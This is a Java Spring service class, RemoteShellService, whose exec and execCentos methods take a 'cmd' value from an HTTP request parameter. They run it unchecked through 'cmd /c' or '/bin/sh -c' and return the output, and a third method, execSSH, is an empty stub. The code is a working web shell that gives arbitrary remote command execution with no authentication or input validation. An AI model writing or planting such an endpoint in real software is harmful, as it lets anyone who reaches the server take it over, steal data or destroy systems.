package com.vsked.service;

import java.io.InputStreamReader;
import java.io.LineNumberReader;

import javax.servlet.http.HttpServletRequest;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Service;

@Service
public class RemoteShellService {
	
	private final Logger log = LoggerFactory.getLogger(RemoteShellService.class);
	
	public String exec(HttpServletRequest req) {
		String result = "";
		try {
			String cmd = req.getParameter("cmd");
			log.debug("|"+cmd+"|");
			String[] command = { "cmd", "/c", cmd };
			Process process = Runtime.getRuntime().exec(command);
			InputStreamReader ir = new InputStreamReader(process.getInputStream());
			LineNumberReader input = new LineNumberReader(ir);
			String line;
			while ((line = input.readLine()) != null) {
				result+= line;
			}
		} catch (Exception e) {
			log.error(e.getMessage(), e);
			result="异常了少年"+e.getMessage();
		}
		return result;
	}
	
	public String execCentos(HttpServletRequest req) {
		String result = "";
		try {
			String cmd = req.getParameter("cmd");
			log.debug("|"+cmd+"|");
			String[] command = { "/bin/sh", "-c", cmd };
			Process process = Runtime.getRuntime().exec(command);
			InputStreamReader ir = new InputStreamReader(process.getInputStream());
			LineNumberReader input = new LineNumberReader(ir);
			String line;
			while ((line = input.readLine()) != null) {
				result+= line;
			}
		} catch (Exception e) {
			log.error(e.getMessage(), e);
			result="异常了少年"+e.getMessage();
		}
		return result;
	}
	
	public String execSSH(){
		String result="";
		try{
			
		}catch(Exception e){
			log.error(e.getMessage(), e);
			result="1异常了少年"+e.getMessage();
		}
		return result;
	}

}
